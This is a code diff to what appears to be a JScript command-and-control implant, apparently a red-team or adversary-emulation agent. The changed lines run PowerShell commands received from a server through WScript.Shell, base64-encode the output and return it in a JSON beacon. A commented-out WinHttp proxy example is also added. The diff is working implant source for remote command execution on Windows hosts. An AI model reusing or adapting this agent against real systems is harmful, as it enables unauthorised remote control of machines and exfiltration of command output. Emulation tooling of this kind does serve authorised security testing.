@@ -133,14 +133,14 @@
 						break;
 						
 					case "pwsh":
-						var r = new ActiveXObject("WScript.Shell").Exec("powershell.exe -Command '" + c + "' ");
+						var r = new ActiveXObject("WScript.Shell").Exec('powershell.exe -Command \"' + c + '\"');
 						while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 						so_b64 = Base64.encode(so); //base64 encode stdout.
 						JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd", "psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"pwsh","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
 						break;
 					
 					case "psh":
-						var r = new ActiveXObject("WScript.Shell").Exec("powershell.exe -Command '" + c + "'" );
+						var r = new ActiveXObject("WScript.Shell").Exec('powershell.exe -Command \"' + c + '\"');
 						while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 						so_b64 = Base64.encode(so); //base64 encode stdout.
 						JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd", "psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"pwsh","Payload":"","Request":"'+JSON.stringify(c)+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
@@ -188,6 +188,21 @@
 			https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-setproxy#examples
 			https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-send
 
+
+			// HttpRequest SetCredentials flags.
+			HTTPREQUEST_PROXYSETTING_DEFAULT   = 0;
+			HTTPREQUEST_PROXYSETTING_PRECONFIG = 0;
+			HTTPREQUEST_PROXYSETTING_DIRECT    = 1;
+			HTTPREQUEST_PROXYSETTING_PROXY     = 2;
+
+			// Instantiate a WinHttpRequest object.
+			var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+
+			// Use proxy_server for all requests outside of 
+			// the microsoft.com domain.
+			WinHttpReq.SetProxy( HTTPREQUEST_PROXYSETTING_PROXY, 
+								 "proxy_server:80", 
+								 "*.microsoft.com");
 
 			*/
 
